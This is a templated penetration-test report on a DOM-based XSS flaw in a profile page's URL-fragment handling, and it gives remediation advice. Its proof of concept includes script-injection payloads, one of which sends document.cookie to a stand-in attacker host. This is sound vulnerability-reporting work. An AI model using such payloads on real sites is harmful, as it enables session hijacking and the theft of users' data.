# Penetration Testing Writeup: DOM-Based XSS Vulnerability

## Executive Summary

A DOM-Based Cross-Site Scripting (XSS) vulnerability was identified in [Target
Application]’s client-side JavaScript code during a recent penetration test.
This vulnerability allows attackers to manipulate the DOM to execute malicious
scripts, potentially compromising user sessions or stealing sensitive data. This
report provides details, proof of concept, and remediation strategies.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - DOM-Based
- **Severity**: High
- **Affected Component**: Client-side JavaScript in the profile page
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/profile#username=[input]`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 18, 2025

### Description

The profile page uses JavaScript to parse the URL fragment (`#username`) and
directly inserts it into the DOM without sanitization. This allows attackers to
inject malicious scripts via the URL, which execute in the victim’s browser.

### Impact

- **Session Hijacking**: Attackers can steal session cookies.
- **Phishing**: Fake forms can capture user credentials.
- **Data Theft**: Sensitive profile data can be exfiltrated.
- **User Redirection**: Users can be redirected to malicious sites.

### Proof of Concept

1. Navigate to:
   `https://[target-application]/profile#username=<script>alert('DOM XSS');</script>`.
2. Observe an alert box with the message "DOM XSS".
3. A malicious payload:
   `#username=<script>fetch('https://attacker.com/steal?data='+document.cookie);</script>`.

### Steps to Reproduce

1. Open `https://[target-application]/profile`.
2. Append `#username=<script>alert('DOM XSS');</script>` to the URL.
3. Load the URL and verify the alert appears.

## Remediation Recommendations

1. **Sanitize DOM Inputs**:
   - Use libraries like DOMPurify to sanitize inputs before DOM insertion.
2. **Avoid Direct DOM Manipulation**:
   - Refrain from using `innerHTML` or similar methods; use `textContent`
     instead.
3. **Content Security Policy (CSP)**:
   - Apply a strict CSP: `Content-Security-Policy: script-src 'self';`.
4. **Code Review**:
   - Review client-side scripts to ensure safe handling of URL fragments.
5. **Security Testing**:
   - Perform regular testing to identify DOM-based XSS issues.

## Conclusion

The DOM-Based XSS vulnerability in [Target Application] poses a significant
risk. Immediate remediation is necessary to protect users and ensure application
security.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![DOM XSS Example](https://example.com/images/dom-xss-example.png)
